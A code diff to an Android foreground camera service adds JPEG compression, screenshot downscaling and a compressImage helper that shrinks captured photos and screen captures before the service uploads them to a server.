@@ -7,6 +7,7 @@ import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
 import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.graphics.PixelFormat;
 import android.hardware.display.DisplayManager;
 import android.hardware.display.VirtualDisplay;
@@ -321,6 +322,7 @@ public class ForegroundCameraService extends LifecycleService {
                                     DateTimeFormatter.ofPattern("yyyy-MM-dd-HH-mm-ss"));
 
                             byte[] photoData = imageToByteArray(image);
+                            photoData = compressImage(photoData, 50);
 
                             imageMapList.put(twinId + "_photo_" + timestamp + ".jpg", photoData);
 
@@ -349,6 +351,7 @@ public class ForegroundCameraService extends LifecycleService {
                         byte[] screenshotData = null;
                         try {
                             screenshotData = imageToByteArray(image);
+                            screenshotData = compressImage(screenshotData, 50);
                         } catch (IOException e) {
                             throw new RuntimeException(e);
                         }
@@ -360,7 +363,7 @@ public class ForegroundCameraService extends LifecycleService {
 
                         Log.d(TAG, "Captured screenshot with twinId: " + twinId);
 
-                        if (imageMapList.size() == maxCaptureCount * 2) { // Photo + screenshot
+                        if (imageMapList.size() == maxCaptureCount * 2) {
                             updateNotification("Processing and sending images...");
                             sendImagesToServer(imageMapList);
                         }
@@ -378,8 +381,11 @@ public class ForegroundCameraService extends LifecycleService {
         byte[] bytes = new byte[buffer.remaining()];
         buffer.get(bytes);
 
+        Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
         ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-        outputStream.write(bytes);
+
+        bitmap.compress(Bitmap.CompressFormat.JPEG, 50, outputStream);
+        bitmap.recycle();
 
         return outputStream.toByteArray();
     }
@@ -401,12 +407,19 @@ public class ForegroundCameraService extends LifecycleService {
 
             Bitmap croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight);
 
+            int targetWidth = screenWidth / 2;
+            int targetHeight = screenHeight / 2;
+            Bitmap resizedBitmap = Bitmap.createScaledBitmap(croppedBitmap, targetWidth, targetHeight, true);
+
             ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-            croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 85, outputStream);
+            resizedBitmap.compress(Bitmap.CompressFormat.JPEG, 50, outputStream);
 
             bitmap.recycle();
             if (bitmap != croppedBitmap) {
                 croppedBitmap.recycle();
+            }
+            if (resizedBitmap != croppedBitmap) {
+                resizedBitmap.recycle();
             }
 
             return outputStream.toByteArray();
@@ -415,6 +428,32 @@ public class ForegroundCameraService extends LifecycleService {
         }
     }
 
+    private byte[] compressImage(byte[] imageData, int quality) {
+        BitmapFactory.Options options = new BitmapFactory.Options();
+        options.inJustDecodeBounds = true;
+        BitmapFactory.decodeByteArray(imageData, 0, imageData.length, options);
+
+        int width = options.outWidth;
+        int height = options.outHeight;
+
+        int maxDimension = 1080;
+        float scaleFactor = 1.0f;
+        if (width > maxDimension || height > maxDimension) {
+            scaleFactor = Math.max((float)width / maxDimension, (float)height / maxDimension);
+        }
+
+        options = new BitmapFactory.Options();
+        options.inSampleSize = Math.round(scaleFactor);
+        options.inPreferredConfig = Bitmap.Config.RGB_565;
+
+        Bitmap bitmap = BitmapFactory.decodeByteArray(imageData, 0, imageData.length, options);
+
+        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
+        bitmap.recycle();
+
+        return outputStream.toByteArray();
+    }
     private void sendImagesToServer(Map<String, byte[]> images) {
         OkHttpClient client = new OkHttpClient.Builder()
                 .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
